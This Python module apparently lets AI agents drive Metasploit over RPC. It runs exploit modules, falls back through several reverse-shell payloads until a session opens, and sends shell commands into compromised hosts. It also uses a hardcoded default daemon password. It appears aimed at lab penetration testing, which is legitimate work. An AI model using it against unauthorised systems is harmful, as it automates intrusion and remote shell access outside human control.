"""
Metasploit RPC Client – Persistent connection for faster, more reliable exploitation.

This replaces the unreliable `msfconsole -x` approach with a persistent RPC connection
to msfrpcd. Benefits:
- No startup overhead for each exploit
- Proper session management
- Timeout handling
- Session reuse across agents

Usage:
    msfrpcd -P cyberagent -S -f &  # Start daemon first
    
    from mcp.msf_rpc_client import MsfRpcClientWrapper
    client = MsfRpcClientWrapper()
    success, session_id, output = client.run_exploit('exploit/unix/ftp/vsftpd_234_backdoor', {...})
"""
import logging
import threading
import time
from typing import Optional

_log = logging.getLogger(__name__)


class MsfRpcClientWrapper:
    """
    Wrapper around pymetasploit3's MsfRpcClient with timeout handling
    and graceful fallback support.
    """
    
    def __init__(
        self, 
        password: str = "cyberagent", 
        host: str = "127.0.0.1", 
        port: int = 55553,
        ssl: bool = False,
        auto_connect: bool = True
    ):
        self.password = password
        self.host = host
        self.port = port
        self.ssl = ssl
        self.client = None
        self._connected = False
        self._lock = threading.Lock()
        
        if auto_connect:
            self._connect()
    
    def _connect(self) -> bool:
        """Establish connection to msfrpcd."""
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            
            _log.info(f"Connecting to msfrpcd at {self.host}:{self.port}...")
            self.client = MsfRpcClient(
                self.password, 
                server=self.host, 
                port=self.port, 
                ssl=self.ssl
            )
            self._connected = True
            _log.info("✅ Connected to msfrpcd successfully")
            return True
            
        except ImportError:
            _log.error("pymetasploit3 not installed. Run: pip install pymetasploit3")
            self._connected = False
            return False
            
        except Exception as e:
            _log.warning(f"Failed to connect to msfrpcd: {e}")
            _log.warning("Start msfrpcd with: msfrpcd -P cyberagent -S -f &")
            self._connected = False
            return False
    
    def is_connected(self) -> bool:
        """Check if RPC client is connected."""
        return self._connected and self.client is not None
    
    def reconnect(self) -> bool:
        """Attempt to reconnect to msfrpcd."""
        self._connected = False
        self.client = None
        return self._connect()
    
    def run_exploit(
        self, 
        module_name: str, 
        options: dict, 
        payload: str = "cmd/unix/reverse",
        timeout: int = 120
    ) -> tuple[bool, Optional[str], str]:
        """
        Run a Metasploit exploit module with given options.
        
        Args:
            module_name: Full module path (e.g., 'exploit/unix/ftp/vsftpd_234_backdoor')
            options: Dict of module options {'RHOSTS': '...', 'LHOST': '...', 'LPORT': 4444}
            payload: Payload to use (default: cmd/unix/reverse)
            timeout: Max seconds to wait for session
        
        Returns:
            (success, session_id, output) tuple - ALWAYS returns this format
        """
        # FIX 3: Wrap entire method in try/except to ALWAYS return tuple
        try:
            if not self.is_connected():
                if not self.reconnect():
                    return (False, None, "RPC not connected. Start msfrpcd first.")
            
            with self._lock:
                # Normalize module name (remove 'exploit/' prefix if present)
                if module_name.startswith('exploit/'):
                    module_path = module_name[8:]  # Remove 'exploit/'
                else:
                    module_path = module_name
                
                _log.info(f"Loading exploit: {module_path}")
                
                try:
                    exploit = self.client.modules.use('exploit', module_path)
                except Exception as e:
                    return (False, None, f"Failed to load module {module_path}: {e}")
                
                # Set options
                for key, value in options.items():
                    try:
                        exploit[key] = value
                        _log.debug(f"  Set {key} = {value}")
                    except Exception as e:
                        _log.warning(f"  Could not set {key}: {e}")
                
                # FIX 3: Try multiple payloads if first fails
                payloads_to_try = [
                    payload,
                    "cmd/unix/interact",
                    "cmd/unix/reverse_bash",
                    "generic/shell_reverse_tcp",
                ]
                
                for attempt_payload in payloads_to_try:
                    result = {}
                    error = {}
                    
                    def execute_exploit():
                        try:
                            result['job'] = exploit.execute(payload=attempt_payload)
                        except Exception as e:
                            error['msg'] = str(e)
                    
                    _log.info(f"Executing exploit with payload: {attempt_payload}")
                    thread = threading.Thread(target=execute_exploit, daemon=True)
                    thread.start()
                    thread.join(timeout=timeout)
                    
                    if thread.is_alive():
                        _log.warning(f"Exploit execution timed out after {timeout}s")
                        continue  # Try next payload
                    
                    if 'msg' in error:
                        _log.warning(f"Payload {attempt_payload} failed: {error['msg']}")
                        continue  # Try next payload
                    
                    # Wait a moment for session to establish
                    time.sleep(3)
                    
                    # Check for new sessions
                    try:
                        sessions = self.client.sessions.list
                        if sessions:
                            session_id = list(sessions.keys())[-1]  # Get newest session
                            session_info = sessions[session_id]
                            _log.info(f"✅ Session {session_id} opened: {session_info}")
                            return (True, str(session_id), f"Session {session_id}: {session_info}")
                    except Exception as e:
                        _log.warning(f"Error checking sessions: {e}")
                    
                    # No session but no error either - continue with next payload
                    _log.info(f"No session with payload {attempt_payload}, trying next...")
                
                return (False, None, "Exploit executed but no session created (all payloads tried)")
                
        except Exception as e:
            # FIX 3: ALWAYS return tuple, never raise
            _log.error(f"Error running exploit: {e}")
            return (False, None, f"Exception: {str(e)}")
    
    def list_sessions(self) -> dict:
        """List all active Metasploit sessions."""
        if not self.is_connected():
            return {}
        try:
            return self.client.sessions.list
        except Exception as e:
            _log.error(f"Error listing sessions: {e}")
            return {}
    
    def interact_with_session(
        self, 
        session_id: str, 
        command: str,
        timeout: int = 10
    ) -> str:
        """
        Send a command to an open session and return output.
        
        Args:
            session_id: The session ID to interact with
            command: Command to execute
            timeout: Max seconds to wait for output
        
        Returns:
            Command output string
        """
        if not self.is_connected():
            return "RPC not connected"
        
        try:
            session = self.client.sessions.session(session_id)
            
            # Write command
            session.write(command + "\n")
            
            # Wait for output
            time.sleep(2)
            output = session.read()
            
            return output if output else "(no output)"
            
        except Exception as e:
            _log.error(f"Error interacting with session {session_id}: {e}")
            return str(e)
    
    def run_shell_command(self, session_id: str, command: str) -> str:
        """Alias for interact_with_session for shell-type sessions."""
        return self.interact_with_session(session_id, command)
    
    def stop_session(self, session_id: str) -> bool:
        """Stop/kill a session."""
        if not self.is_connected():
            return False
        try:
            self.client.sessions.session(session_id).stop()
            _log.info(f"Session {session_id} stopped")
            return True
        except Exception as e:
            _log.warning(f"Error stopping session {session_id}: {e}")
            return False
    
    def get_session_info(self, session_id: str) -> dict:
        """Get information about a specific session."""
        if not self.is_connected():
            return {}
        try:
            sessions = self.client.sessions.list
            return sessions.get(session_id, {})
        except Exception as e:
            return {"error": str(e)}
    
    def run_auxiliary(
        self, 
        module_name: str, 
        options: dict,
        timeout: int = 60
    ) -> tuple[bool, str]:
        """
        Run an auxiliary module (scanner, etc.).
        
        Args:
            module_name: Full module path (e.g., 'auxiliary/scanner/smb/smb_version')
            options: Dict of module options
            timeout: Max seconds to wait
        
        Returns:
            (success, output) tuple
        """
        if not self.is_connected():
            return False, "RPC not connected"
        
        try:
            # Normalize module name
            if module_name.startswith('auxiliary/'):
                module_path = module_name[10:]
            else:
                module_path = module_name
            
            aux = self.client.modules.use('auxiliary', module_path)
            
            for key, value in options.items():
                try:
                    aux[key] = value
                except:
                    pass
            
            result = {}
            
            def execute():
                result['output'] = aux.execute()
            
            thread = threading.Thread(target=execute, daemon=True)
            thread.start()
            thread.join(timeout=timeout)
            
            if thread.is_alive():
                return False, f"Timeout after {timeout}s"
            
            return True, str(result.get('output', ''))
            
        except Exception as e:
            return False, str(e)
    
    def search_modules(self, query: str, module_type: str = "exploit") -> list[str]:
        """
        Search for Metasploit modules.
        
        Args:
            query: Search query (e.g., 'vsftpd', 'samba')
            module_type: 'exploit', 'auxiliary', 'post', 'payload'
        
        Returns:
            List of matching module names
        """
        if not self.is_connected():
            return []
        
        try:
            modules = self.client.modules.exploits if module_type == "exploit" else \
                      self.client.modules.auxiliary if module_type == "auxiliary" else \
                      self.client.modules.post if module_type == "post" else []
            
            query_lower = query.lower()
            return [m for m in modules if query_lower in m.lower()]
            
        except Exception as e:
            _log.error(f"Error searching modules: {e}")
            return []


# Singleton instance for reuse across agents
_rpc_instance: Optional[MsfRpcClientWrapper] = None


def get_msf_rpc(
    password: str = "cyberagent",
    host: str = "127.0.0.1", 
    port: int = 55553
) -> MsfRpcClientWrapper:
    """
    Get a shared MsfRpcClientWrapper instance.
    Creates one if it doesn't exist or reconnects if disconnected.
    """
    global _rpc_instance
    
    if _rpc_instance is None:
        _rpc_instance = MsfRpcClientWrapper(password, host, port)
    elif not _rpc_instance.is_connected():
        _rpc_instance.reconnect()
    
    return _rpc_instance


# ══════════════════════════════════════════════════════════════════════════════
# CLI Test
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import sys
    
    print("=== MSF RPC Client Test ===\n")
    
    client = MsfRpcClientWrapper()
    
    if not client.is_connected():
        print("❌ Not connected to msfrpcd")
        print("Start it with: msfrpcd -P cyberagent -S -f &")
        sys.exit(1)
    
    print("✅ Connected to msfrpcd\n")
    
    # List modules
    print("Searching for vsftpd exploits...")
    modules = client.search_modules("vsftpd")
    for m in modules[:5]:
        print(f"  - {m}")
    
    # List sessions
    print("\nActive sessions:")
    sessions = client.list_sessions()
    if sessions:
        for sid, info in sessions.items():
            print(f"  Session {sid}: {info}")
    else:
        print("  (none)")
    
    print("\n✅ RPC client working")
